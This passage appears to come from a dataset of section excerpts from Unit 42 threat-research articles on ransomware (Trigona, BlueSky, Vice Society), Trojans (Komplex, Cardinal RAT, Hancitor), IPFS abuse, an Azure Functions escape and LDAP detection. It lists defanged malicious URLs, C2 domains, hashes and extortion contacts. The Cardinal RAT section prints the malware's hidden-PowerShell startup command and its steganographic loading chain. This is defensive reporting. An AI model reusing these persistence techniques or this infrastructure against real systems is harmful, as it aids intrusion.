tools form the foundation of cloud security. Their operations center on guardrail control monitoring to ensure that cloud environments maintain secure configurations and are free from vulnerabilities and misconfigurations.\nPosture management monitoring is traditionally based on time-specific security scanning of a cloud environment's resources and configurations. Alerts are triggered when a new or modified cloud resource appears to pose potential security risks.\nFor example, an alert will be triggered if an IAM policy is overly permissive and allows access to other cloud resources. It will also be triggered if a cloud compute instance or serverless function contains vulnerabilities or misconfigurations.\nPosture management scanning operations are performed on a routine schedule, often hourly or daily. Some CSPM security tools allow for the monitoring of cloud platform auditing logs as well, which can assist in detecting suspicious activity as it occurs within a cloud service platform (CSP). It is critical that organizations configure their CSPM platform to collect the audit logs from their third-party cloud-based software-as-a-service (SaaS) applications to ensure visibility.\nCDR tools provide runtime monitoring detections by collecting, identifying and even preventing operations that occur during a particular event. By collecting the logs from cloud compute instances, CSP logging resources and third-party cloud SaaS applications, CDR security tools can identify, alert on and prevent malicious cloud events.\nExamples of these operations include the execution of an API request against a cloud platform or cloud application such as:\nCreating new cloud users or service accounts \nAttaching IAM policies to new or established IAM users or roles \nEstablishing network connections from a Tor exit node or VPN host\nIn contrast to posture management tools, runtime monitoring tools continuously monitor the cloud environment and often require a dedicated agent to maintain visibility of the cloud resources. When an agent is installed, cloud runtime monitoring security tools allow for the detection - and even prevention - of malicious cloud operations as they occur.", "source": "Palo"}, {"title": "Conclusion", "content": "CDR runtime monitoring is a critical aspect of maintaining a secure-cloud, hybrid-cloud and multi-cloud environment. As the trending high and medium severity alert data discussed in this article demonstrate, there was a 388% increase in the average number of alerts that cloud environments witnessed during 2024.\nA significant number of these alerts are the direct result of the detection of runtime operations, which cannot be detected with posture management (CSPM) tools alone. CDR tools provide cloud runtime detection capabilities, enabling the detection of malicious events occurring on cloud compute instances, container hosts or serverless functions.\nGiven the increasing threats targeting cloud environments, the only real defense for these environments is to require cloud-based agents for publicly exposed and critical cloud endpoints, CSP audit logging and cloud third-party SaaS applications. Using a CDR analytics tool allows defenders to collect, detect and prevent the execution of malicious operations that can affect any of these resources. The combination of runtime monitoring, analysis and response for cloud resource event logging is essential to ensure that malicious operations are not allowed to function within cloud environments.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response team, or call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Trigona ransomware is a relatively new strain that security researchers first discovered in late October 2022. By analyzing Trigona ransomware binaries and ransom notes obtained from VirusTotal, as well as information from Unit 42 incident response, we determined that Trigona was very active during December 2022, with at least 15 potential victims being compromised. Affected organizations are in the manufacturing, finance, construction, agriculture, marketing and high technology industries.\nUnit 42 researchers identified two new Trigona ransom notes in January 2023 and two in February 2023. Trigona's ransom notes are unique; rather than the usual text file, they are instead presented in an HTML Application with embedded JavaScript containing unique computer IDs (CID) and victim IDs (VID).\nPalo Alto Networks helps detect and prevent Trigona ransomware with the following products and services:Cortex XDR,Prisma CloudandNext-Generation Firewalls(including cloud-delivered security subscriptions such asWildFire) and throughincident response.", "source": "Palo"}, {"title": "Conclusion", "content": "Trigona is a newer strain of ransomware that, to date, has had minimal coverage by security news articles. This lack of security community awareness allows Trigona to discreetly attack victims while other higher-profile ransomware operations dominate the news headlines. We hope that shining a light on Trigona and its uncommon technique of using password-protected executables to obfuscate malware helps defenders better protect their organizations against this threat.\nDue to the stream of victims identified by the Unit 42 team and Trigona's currently developing leak site, the operator and/or affiliates behind the ransomware likely will continue (and possibly even ramp up) its malicious activity.\nPalo Alto Networks customers receive protections from Trigona threats through the following products:\nWildFirecurrently lists all known binaries of Trigona as malicious, which will trigger alerting withinPrisma CloudandCortex XDR. \nPrisma Cloud will detect any instance of this malware being executed through properly configured Defender agents using Wildfire.Additionally, Prisma Cloud Defender agents can be installed on Windows 2016 and 2019 servers, as well as on Windows Docker Container hosts. \nAdditionally, Prisma Cloud Defender agents can be installed on Windows 2016 and 2019 servers, as well as on Windows Docker Container hosts.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform.\nThe Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy - the Carberp variant that Sofacy had used inprevious attack campaignson systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.", "source": "Palo"}, {"title": "Conclusion", "content": "The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy's Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.\nWhile Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:\nWildFire correctly identifies known Komplex executables as malicious \nIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan. \nCustomers can track this Trojan via theKomplextag in AutoFocus.", "source": "Palo"}, {"title": "IOC", "content": "Hashes:2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d496a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc545a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54\nC2 Locations:appleupdate[.]orgapple-iclouds[.]netitunes-helper[.]net185.10.58.170", "source": "Palo"}, {"title": "Introduction", "content": "Hancitor is an information stealer and malware downloader used by a threat actor designated as MAN1, Moskalvzapoe or TA511. In athreat brief from 2018, we noted Hancitor was relatively unsophisticated, but it would remain a threat for years to come. Approximately three years later, Hancitor remains a threat and has evolved to use tools likeCobalt Strike. In recent months, this actor began using a network ping tool to help enumerate the Active Directory (AD) environment of infected hosts. This blog illustrates how the threat actor behind Hancitor uses the network ping tool, so security professionals can better identify and block its use.\nAs early as October 2020, Hancitor began utilizing Cobalt Strike and some of these infections utilized a network ping tool to enumerate the infected host's internal network. Normal ping activity is low to nonexistent within a Local Area Network (LAN), but this ping tool generates approximately 1.5 GB of Internet Control Message Protocol (ICMP) traffic as it pings more than 17 million IP addresses of internal, non-routable IPv4 address space.\nTo understand how this ping tool is used, we must first understand the chain of events for current Hancitor activity. This blog reviews examples of recent Hancitor infections within AD environments. This blog also contains relatively new indicators noted from this threat actor as of February 2021, and it provides five examples of the associated network ping tool seen in December 2020 and January 2021.\nPalo Alto NetworksNext-Generation Firewallcustomers are protected from this threat with aThreat Preventionsecurity subscription.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise described in this report, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.", "source": "Palo"}, {"title": "Conclusion", "content": "Post-infection activity from Hancitor malware has settled into noticeable patterns. These patterns include the use of Cobalt Strike for a Hancitor infection within an AD environment. In some cases, follow-up malware sent through Cobalt Strike may include a network ping tool that generates an abnormally large amount of ICMP traffic as it pings over 17 million internal IPv4 addresses.\nOrganizations with decent spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection from Hancitor and its post-infection activity. Palo Alto Networks Next-Generation Firewall customers are further protected from this threat with a Threat Prevention security subscription.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise described in this report, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visitwww.cyberthreatalliance.org.\nAppendix ASHA256 hashes for 127 samples of Word documents with macros for Hancitor from Nov. 5, 2020, through Feb. 25, 2021. Information is availablein this GitHub repository.\nAppendix BSHA256 hashes for 63 examples of Hancitor DLL files from Nov. 5, 2020, through Feb. 25, 2021. Information is availablein this GitHub repository.\nAppendix CInformation for five samples of the network ping tool seen from Hancitor infections using Cobalt Strike from December 2020-January 2021. Information is availablein this GitHub repository.\nAppendix DInformation for three samples of Ficker Stealer malware associated with Hancitor infections from October 2020 through March 2021. Information is availablein this GitHub repository.\nAppendix EInformation for a sample Send-Safe spambot malware associated with a Hancitor infection from February 2021. Information is availablein this GitHub repository.", "source": "Palo"}, {"title": "Introduction", "content": "BlueSky ransomware is an emerging family that has adopted modern techniques to evade security defenses.\nRansomware is a malicious program designed to encrypt a user's data and demand a ransom for the decryption. BlueSky ransomware predominantly targets Windows hosts and utilizes multithreading to encrypt files on the host for faster encryption.\nIn our analysis, we found code fingerprints from samples of BlueSky ransomware that can be connected to theConti ransomware group. In particular, the multithreaded architecture of BlueSky bears code similarities with Conti v3, and the network search module is an exact replica of it.\nHowever, in another respect, BlueSky more closely resemblesBabuk Ransomware. Both useChaCha20, an algorithm for file encryption, along withCurve25519for key generation.\nAccording to research done byCloudSEK, PowerShell scripting is used to drop and download BlueSky ransomware from a fake website to encrypt data. After successful encryption, BlueSky Ransomware renames the encrypted files with the file extension.blueskyand drops a ransom note file named# DECRYPT FILES BLUESKY #.txtand# DECRYPT FILES BLUESKY #.html.\nPalo Alto Networks customers receive protections from BlueSky ransomware and other types of ransomware throughCortex XDR,theNext-Generation Firewallandcloud-delivered security servicesincludingWildFire. TheAdvanced URL Filteringsubscription provides real-time URL analysis and malware prevention for BlueSky ransomware.\nIf you think you may have been impacted by a cyber incident, theUnit 42 Incident Response teamis available 24/7/365. You can also take preventative steps by requesting any of ourcyber risk management services.", "source": "Palo"}, {"title": "Conclusion", "content": "Ransomware authors are adopting modern advanced techniques such as encoding and encrypting malicious samples, or using multi-staged ransomware delivery and loading, to evade security defenses. BlueSky ransomware is capable of encrypting files on victim hosts at rapid speeds with multithreaded computation. In addition, the ransomware adopts obfuscation techniques, such as API hashing, to slow down the reverse engineering process for the analyst.\nIt is very likely that ransomware attacks will continue to grow with advanced encryption techniques and delivery mechanisms.\nPalo Alto Networks customers withCortex XDR, theNext-Generation FirewallandAdvanced URL Filteringbenefit from protections against the attacks discussed in this article. Additionally, the malicious indicators (domains, URLs and hashes) can be prevented with ourDNS SecurityandWildFireservices.\nIf you think you may have been impacted or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nIf you have cyber insurance, you can request Unit 42 by name. You can also take preventative steps by requesting any of ourcyber risk management services, such as ourRansomware Readiness Assessment.", "source": "Palo"}, {"title": "Indicators", "content": "URLs\nhxxps://kmsauto[.]us/someone/l.exe \nhxxps://kmsauto[.]us/app1.bin \nhxxps://kmsauto[.]us/server.txt \nhxxps://kmsauto[.]us/encoding.txt \nhxxps://kmsauto[.]us/all.txt \nhxxps://kmsauto[.]us/someone/spooler.exe \nhxxps://kmsauto[.]us/sti/sti.bin \nhxxps://kmsauto[.]us/someone/potato.exe \nhxxps://kmsauto[.]us/someone/ghost.exe \nhxxps://kmsauto[.]us/someone/start.ps1\nRansom Note URLs\nhttp://ccpyeuptrlatb2piua4ukhnhi7lrxgerrcrj4p2b5uhbzqm2xgdjaqid.onion\nRegistry Paths\nHKCU\\Software\\<32-byte hex string>\\completed \nHKCU\\Software\\<32-byte hex string>\\recoveryblob \nHKCU\\Software\\<32-byte hex string>\\x25519_public", "source": "Palo"}, {"title": "Introduction", "content": "During 2022, analysts from Unit 42 observed the rampant adoption of the InterPlanetary File System (aka IPFS) being used as a vehicle for malicious intent. IPFS is a Web3 technology that decentralizes and distributes the storage of files and other data into a peer-to-peer network.\nLike any technology, IPFS can be abused by malicious threat actors. However, because the hosted content on IPFS is decentralized and distributed, there are challenges in locating and removing malicious content from the ecosystem, making it akin to bullet-proof hosting.\nFrom thelast quarter of 2021 through the end of the last quarter of 2022, Palo Alto Networks detected an 893% increase in IPFS-related traffic. Our calculations also show that VirusTotal reported over 27,000% increase during the same period.\nThis increase in IPFS-related traffic is rife with notable increases in malicious activity, as can be expected. Analysts from Unit 42 observed numerous threat campaigns in 2022 that covered the gamut of phishing, credential theft, malicious payload distribution and general adoption by threat actors.\nSome of the key takeaways from our analysis include the following:\nThere was a significant jump in IPFS-related traffic at the beginning of 2022. Palo Alto Networks detected a178% increasein IPFS-related traffic from thelast quarter of 2021 to the first quarter of 2022, whileVirusTotal reported more than 6,500% increaseduring that same reporting period. \nWe have identified threat actors discussing the adoption of the technology on forums in the dark web as well as threat actors selling services hosted on IPFS. \nWe have seen several types of cyberthreats using IPFS, including phishing, credential theft, command and control (C2) communications, and malicious payload distribution.\nPalo Alto Networks customers receive protections from the malware families discussed as well as their malicious components in the following ways:\nCortex XDR \nTheNext-Generation FirewallwithCloud-Delivered Security ServicesincludingWildFireandAdvanced Threat Prevention. \nAdvanced URL FilteringandDNS Securitycan analyze and block malicious IPFS domains, including malware and phishing hosting URLs, and C2 domains.", "source": "Palo"}, {"title": "Conclusion", "content": "Threat actors increasing their adoption of IPFS is a growing concern because, as a decentralized and distributed storage technology, IPFS poses unique challenges in locating and removing malicious content from the ecosystem. It is important to note that there is no single solution for removing malicious content from the IPFS networks. Different approaches might be more or less effective depending on the specific circumstances and the participation of the owners of the decentralized networks in which the content is ultimately hosted.\nThe significant increase in IPFS-related traffic we observed during 2022 at Palo Alto Networks and VirusTotal data highlights the growing popularity of this technology among threat actors. The threat campaigns observed by analysts from Unit 42 demonstrate the versatility of IPFS for carrying out a variety of malicious activities, including phishing, credential theft, C2 communications and payload distribution.\nThreat actors' adoption of IPFS, as well as the sale of services hosted on IPFS, underscores the need for continued vigilance and proactive measures to detect and mitigate threats on this platform. It is imperative that the cybersecurity community remains vigilant and takes proactive steps to stay ahead of evolving threats on IPFS and other emerging technologies.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers investigated Azure's serverless architecture and found that we were able to break out of the serverless function to the underlying host. We also discovered that our host was actually a HyperV virtual machine that hosted several other serverless functions.\nAzure serverless functions (commonly referred to as Azure Functions) is a serverless compute service that enables users to run event-triggered code without having to provision or manage the infrastructure. Being a trigger-based service, it runs code in response to a variety of events. In the case of our research, this event was a web page request.\nWe found out that for each function, a new container is generated by the host. Each container will be terminated and deleted after several minutes, to differentiate serverless function from traditional containers as a service.\nThe host in question hosted only functions that our Azure user had access to anyway, so no real damage could be done. It is clear Microsoft went to great lengths to stop people from getting to the host, so it is possible there are other findings yet to be uncovered there. There could be important information on the virtual machine that shouldn't be visible, which could be discovered by a sufficiently motivated attacker.\nMicrosoft often uses containers to strengthen security but \u2013 because containers inherently aren't as secure as virtual machines \u2013 they usually do not treat them as a security boundary. In this case, they implemented additional layers of security, which proved to be effective.\nPrisma's serverless solutionhas function discovery and vulnerability scanning for most cloud providers. These features effectively put another set of eyes on the organization's serverless functions, alerting you in case known vulnerabilities are observed in those functions.", "source": "Palo"}, {"title": "Conclusion", "content": "All the resources the virtual machine hosted were accessible by our Azure's user regardless, so in that regard this escape had no actual immediate impact. This is an example of cloud providers' mitigations working as intended. In this case, their choice of not relying on the container as a security boundary plus implementing another line of defense proved to be a smart move.\nHowever, this issue could have a huge impact if (for example) another vulnerability in the virtual machine itself is found. Furthermore, Microsoft is known to have fixed similar issues in the past, even if they've not called them vulnerabilities per se.\nWe felt like this was a good place to stop the research and post our findings, rather than investigating the virtual machine thoroughly. It is possible that the virtual machine contains important information or secrets that shouldn't be visible to the serverless function user, or to a possible attacker. We are certain that other researchers in the cloud community would take it from here and investigate further, until Microsoft patches this issue.\nAfter sharing our findings with Microsoft, they have taken the following defense-in-depth measures into consideration to better protect customers:\nAdditional validation for bind mount APIs to prevent mounting over. \nRemoving symbols from binaries where possible.", "source": "Palo"}, {"title": "Appendix", "content": "Prisma's serverless solution has function discovery and vulnerability scanning for most cloud providers. These features implement another set of eyes for the organization's serverless functions, and they will alert in case of known vulnerabilities in those functions.\nFor AWS specifically, Prisma also offers deep visibility with Prisma's Serverless Radar, compliance and detection of over-privileged roles, and serverless WAAS.\nFurthermore, Prisma's Serverless Defender also protects serverless functions at runtime. It monitors the customer's functions to ensure they execute as designed. Per-function policies let the customer control the following:\nProcess activity \u2013 Enables verification of launched subprocesses against policy. \nNetwork connections \u2013 Enables verification of inbound and outbound connections and permits outbound connections to explicitly allowed domains. \nFile system activity \u2013 Controls which parts of the file system functions can access.\nCurrently, Prisma Cloud supports AWS Lambda functions (Linux) and Azure Functions (Windows only).\nThe following runtimes are supported for AWS Lambda:\nC# (.NET Core) 3.1 \nJava 8, 11 \nNode.js 12.x, 14.x \nPython 3.6, 3.7, 3.8, 3.9 \nRuby 2.7\nThe following runtimes are supported for Azure Functions (Windows only):\nv3 - C# (.NET Core) 3.1, 5.0 \nv4 - C# (.NET Core) 4.8, 6.0", "source": "Palo"}, {"title": "Introduction", "content": "Sincethe original discovery of Cardinal RAT, the attackers have made some minor updatesthatare worth discussing, particularly regardingobfuscation techniques. For the sake of this analysis we'll look atthemost recent version of CardinalRAT:\nThe last timewe wrote about Cardinal RAT in 2017, we looked at version 1.4 of the malware family.We identify this latest sample as version 1.7.2 based on information within the payload. Unlike previously discussed samples, thislatestinstance of Cardinal RAT employs various obfuscation techniques to hinder analysis of the underlying code. The first layer of obfuscation comes in the form of steganography;the initial sample is compiled with .NET and contains an embedded bitmap (BMP) file.\nFigure1.Embedded BMP file contained within .NET loader\nUpon execution, the malware will read this file, parse out pixel data from the image, and decrypt the result using a single-byte XOR key.We have provided aPython script to automate this process in the Appendix of the blog post. The result is a DLLalso compiled with .NET,with the following hash:\nAfter this file has been loaded in memory, the initial loader will load and execute the 'corerun'function, initiating the second stage of the malware.TheDLL begins by performing a sleep using the built-in Windowschoiceutility:\ncmd.exe /c choice /C Y /N /D Y /T 20\nThe command promptsthe user for a choice with a 20 second timeout,at which pointthe process will exit.Since the window is hidden, and there is no utility for this choice, themalware simplyuses this as an alternativesleep command.\nThesecond stageDLL readsin the 'strings' embedded resource from the first stage executable.Part of this resource is decrypted to provide configuration information to the dropper. This configuration information will instruct whether or not the malwareentersits installation routine.In the installation routine,itbeginsbywriting a unique GUID identifier to %TEMP%\\[random].ini. Afterwards,it createsthe following directory:\n%APPDATA%\\Microsoft\\Windows\\IEConfig\nIt then writes an embedded executable with the hash below to %TEMP%\\[random].exe. This file has an internal filename of RunExecutive.exe and simply copies the contents of argument #2 to the file path specified in argument #1.\nThe malware creates anLNK file in the victim's startup folder witharandomly generatedfilename using aGUID (Example:{fcb29182-b3cc-47e2-a95c-b22c6d87dda1}.lnk). TheLNK fileexecutes the followingcommand:\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden \"%APPDATA%\\Microsoft\\Windows\\IEConfig\\[random]\\sqlreader.exe\"\nFinally, the malware will execute the previously writtenRunExecutiveexecutable with arguments to copy the original executable to the previously referenced sqlreader.exe file path.\nTheremaining segment of theembeddedresource is decrypted using a 16-byte XOR key, resulting in a .NET executable. This executable isinjected into one of the following two legitimate executablesor processeson the system:\nRegSvcs.exe\nRegAsm.exe\nInprevious versions of this malware family,there were alarger number oflegitimate processes Cardinal RAT would inject into. The final payload has the following hash:\nUnderneath all this obfuscation,this Cardinal RAT payload doesnothaveany significant changes compared to the previously discussed versionin terms of its operation or capabilities.One of the most significant changeslies inthe obfuscation used by the malware;all of the functions, methods, and variables have been renamed toMD5 hashes.\nFigure2.Obfuscation present in Cardinal RAT payload\nIn addition to the obfuscation routines in use, there have been a few minor changes within the malware itself. First,the embedded configuration has a few changes both in the order of the embedded values, as well as what values are present. Additionally, the way this configuration is encoded has changed slightly, asseveralvaluesthat were previously base 64 encoded in version 1.4are no longer base64-encoded.\n$ python parseConfig.py GreyCardinalConfig\nMutex: {509ce3ef-e03e-467e-be19-710782f13c28}\nCampaign Identifier: '\\xf1\\xaf\\x02i.]\\xa4\\xe0'\nC2 Server: affiliatecollective[.]club\nC2 Port: 443\nHash Value: 0304674e9876530dfbea5a9b4fec7b98\nAdditional C2 Servers: 0\nGUID: '\\xd6\\x04hr\\x9a\\xedLN\\xae\\xe8\\xd0\\x87\\x80\\x19\\x15z'\nBuffer Size: 81920\nMax Buffer Size: 40960000\nSleep Timer Between Requests: 2000\nUnused Integer: 60000\nUnused Integer: 0\nPerform Keylogging: 0\nDisable Sleep on Victim: 0\nNetwork communication and actions available to the remote operator remain consistent between versions. The script provided inourprevious report continues to work as expected against the network traffic generated by this malware family. The following actions continue to be present within the malware:\nCollect victim information \nUpdate settings \nAct as a reverse proxy \nExecute command \nUninstall itself \nRecover passwords \nDownload and Execute new files \nKeylogging \nCapture screenshots \nUpdate Cardinal RAT \nClean cookies from browsers", "source": "Palo"}, {"title": "Conclusion", "content": "CardinalRAT and EVILNUMare both usedinlimited distribution attacks against FinTech companies. Inonecase,both families were observedat the same target in a short space of time, whilst droppers forboth families sharesimilarly themed lure documents.\nWe suggest that these families are used in targeted attacks against FinTech companies because:\nOur telemetry shows these families are only used against companies in this sector. \nThe lure documents used consistently related to lists of names/numbers of individuals involved in trading forex/crypto currency, a niche theme to use if targeting individuals outside of this sector.\nWebelieve it's possible that bothfamilies are used by the same attackersbecause:\nWe know of two cases where a company was targeted or appears to have been targeted by both malware families in short succession. \nBoth families have been distributed using malicious documents containing lists of names/numbers of individuals involved in trading forex/crypto currency. \nThe differences in geographical distribution can be easily explained as a difference in visibility.\nHowever, there are a number of arguments against the two families being related:\nIn terms of the geographic spread of where these families are seen, the targeting for each family seems to be quite different. \nThe delivery methods for each family do not share any similarities. \nThe infrastructure associated with each malware family is distinctive and different withno cross-over in terms of hosting providers or other attributes being observed.\nEven if the two families are not linked, they both have similar targetinginterests, andso FinTech organisations should ensure they are protected against the malware used.Whilst we haven't been able to gain an insight into what the attackers do once successfully on a target network, it's likely (based on the targets) they usetheir accessto facilitate financial gain.\nOrganizations witheffectivespam filtering, proper system administration, and up-to-date Windows hosts have a much lower risk of infection.Genericdefensesagainst these threats include:\nDo not allow inbound e-mails with LNK fileas attachments,or, do not allow inbound e-mails with attached ZIP files containing a single LNK file inside them. \nDo not allow inbound e-mails from external sources where the documents contain macros, or,if you do,ensure proper policyis configured. \nEnforce parent-child processpoliciesto restrict use of scripting languages by malware.\nPalo Alto Networks customers are further protected from this threatby:\nEVILNUM variants are blocked byour IPS, see threat IDs 18781 and 18782. \nWildfireand Traps detect allfiles referencedas malware.\nAutoFocususers can track this activity using theCardinalRAT,CarpDownloaderandEVILNUMtags.", "source": "Palo"}, {"title": "Introduction", "content": "This article provides a practical guide to developing a detection strategy for Lightweight Directory Access Protocol (LDAP)-based attacks. We analyze real-world examples of nation-state and cybercriminal threat actors abusing LDAP attributes. We also examine common LDAP enumeration queries and assess their potential risks.\nLDAPis a powerful protocol for accessing and managing directory services likeActive Directory. LDAP is commonly used by criminals forlateral movementand critical assetsenumerationin on-premises cyberattacks. Threat actors also frequently use tools likeBloodHoundandSharpHound, which leverage LDAP for malicious purposes.\nDistinguishing benign from malicious LDAP activity within an organization is challenging. The high volume of benign event logs generated by a domain controller makes collecting as well as detecting malicious LDAP activity extremely difficult.\nPalo Alto Networks customers are better protected against LDAP-based attacks throughCortex XDR,XSIAMandXpanse, which we detail further in theConclusion.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "LDAP is a double-edged sword in Active Directory. It is essential for administration yet vulnerable to exploitation. While LDAP simplifies directory management, attackers can exploit its powerful querying capabilities to gather sensitive information.\nThis article highlights the challenges of detecting malicious LDAP activity. It also provides real-world examples of LDAP enumeration attacks, along with practical detection tips.\nUnderstanding and monitoring LDAP enumeration, coupled with robust detection strategies, is essential to mitigating risks and securing directory services.", "source": "Palo"}, {"title": "Introduction", "content": "Vice Society is a ransomware gang that has been involved in high-profile activity against schools this year. Unlike many other ransomware groups such as LockBit that follow a typical ransomware-as-a-service (RaaS) model, Vice Society's operations are different in that they've been known for using forks of pre-existing ransomware families in their attack chain that are sold on DarkWeb marketplaces. These include theHelloKitty(aka FiveHands) andZeppelinstrains of ransomware as opposed to Vice Society developing their own custom payload.\nIn September 2022, ajoint Cybersecurity Advisory(CSA) from the FBI, CISA and the MS-ISAC declared they had recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks. The CSA continued that attacks could increase as the 2022-23 school year begins and criminal ransomware groups perceive opportunities for successful attacks.\nVice Society first surfaced in the summer of 2021, and in that time frame it was seen exploiting theCVE-2021-34527(aka PrintNightmare)vulnerability as part of their attack chain. The gang is also known to target backups and exfiltrate data from compromised systems to be leveraged for the purpose of double extortion, a common ransomware operation tactic where victims are pressured to pay a specified ransom amount in exchange for decryption and to avoid having sensitive data published on the attacker's dedicated leak site.\nPalo Alto Networks customers receive protections against ransomware used by Vice Society from Cortex XDR, as well as from the WildFire cloud-delivered security service for the Next-Generation Firewall. The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Conclusion", "content": "School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable to threat actors. The opportunistic targeting often seen with cybercriminals can put even school districts with robust cybersecurity programs at risk. K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers.\nVice Society and its consistent targeting of the education industry vertical, particularly around the September time frame, serves as a warning that this group has shaped their campaigns to take advantage of the school year in the U.S. It's likely they'll maintain use of these tactics to impact the cyberthreat landscape moving forward, as long as their activities continue to be lucrative for them.\nEducational institutions should continue to implement security best practices and be wary of the ongoing threat of ransomware, especially during the start and end of the school year.\nK-12 institutions and universities do have an advantage when it comes to protecting themselves that too few organizations use to its full potential. In a school environment, there are many educators who can help inform trainings for both staff and students to learn what they need to do to maintain security for everyone in the organization.\nVice Society's use of multiple ransomware payloads across both Windows and Linux hosts shows that they're continually evolving. They will likely continue leveraging additional ransomware strains in the future, as well as exploiting newly disclosed vulnerabilities.\nAs we do with other ransomware groups, Unit 42 strongly advises organizations that have been impacted by Vice Society to avoid paying a ransom if possible, and to instead consult a trusted IR negotiation team for the best course of action.\nPalo Alto Networks customers receive protections against ransomware used by Vice Society fromCortex XDR, as well as from theWildFirecloud-delivered security service for theNext-Generation Firewall.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "IOC", "content": "HelloKitty Elf samples featuring Vice Society ransom note header:\n643a3121166cd1ee5fc6848f099be7c7c24d36f5922f58052802b91f032a5f0f \n754f2022b72da704eb8636610c6d2ffcbdae9e8740555030a07c8c147387a537 \n78efe6f5a34ba7579cfd8fc551274029920a9086cb713e859f60f97f591a7b04 \n16a0054a277d8c26beb97850ac3e86dd0736ae6661db912b8782b4eb08cfd36e\nZeppelin ransomware with the Vice Society ransom note header:\n4a4be110d587421ad50d2b1a38b108fa05f314631066a2e96a1c85cc05814080 \n307877881957a297e41d75c84e9a965f1cd07ac9d026314dcaff55c4da23d03e \nfaa79c796c27b11c4f007023e50509662eac4bca99a71b26a9122c260abfb3c6 \ndd89d939c941a53d6188232288a3bd73ba9baf0b4ca6bf6ccca697d9ee42533f \n4440763b18d75a0f9de30b1c4c2aeb3f827bc4f5ea9dd1a2aebe7e5b23cfdf94 \n24efa10a2b51c5fd6e45da6babd4e797d9cae399be98941f950abf7b5e9a4cd7 \nbafd3434f3ba5bb9685e239762281d4c7504de7e0cfd9d6394e4a85b4882ff5d \naa7e2d63fc991990958dfb795a0aed254149f185f403231eaebe35147f4b5ebe \n001938ed01bfde6b100927ff8199c65d1bff30381b80b846f2e3fe5a0d2df21d \nAb440c4391ea3a01bebbb651c80c27847b58ac928b32d73ed3b19a0b17dd7e75\nContact information:\nvicesociety@onionmail[.]org \nv-society.official@onionmail[.]org \nLarryGold@onionmail[.]org \nMollyThomson@onionmail[.]org \nBruceBoyle@onionmail[.]org \nSylvesterJones@onionmail[.]org \nbrendaevans4454@onionmail[.]org \nwarreinolds77@onionmail[.]org \nDaltonReed@onionmail[.]org \nFreddieFerrell@onionmail[.]org \nlewiselsberry@onionmail[.]org 